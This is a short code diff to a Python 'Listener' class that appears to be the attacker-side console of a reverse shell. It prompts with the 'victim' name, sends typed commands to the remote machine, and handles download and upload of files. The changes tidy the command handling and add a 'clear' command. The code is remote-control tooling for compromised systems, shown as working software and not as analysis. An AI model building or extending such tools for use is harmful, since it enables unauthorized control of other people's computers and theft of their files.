@@ -1,4 +1,4 @@
-import socket,os
+import socket,os,subprocess
 
 
 class Listener:
@@ -56,17 +56,22 @@ class Listener:
         while(True):
             try:
                 cmd = str(input("[" + self.victim + "]>> "))
+                if(len(cmd.strip())<1):
+                    self.run()
                 self.r_send(cmd)
                 cmd = cmd.split(' ')
                 if cmd[0] == "download":
                     self.download(cmd[1])
-                if cmd[0] == "upload":
+                elif cmd[0] == "upload":
                     self.upload(cmd[1])
-                if len(cmd)<2 and cmd[0] == "cd":
+                elif len(cmd)<2 and cmd[0] == "cd":
                     print("[-] Please select a directory")
+                elif cmd[0] == "clear":
+                    subprocess.call('clear',shell=True)
                 else:
                     result = self.r_recv()
                     print(result)
+                    
 
                 
                 
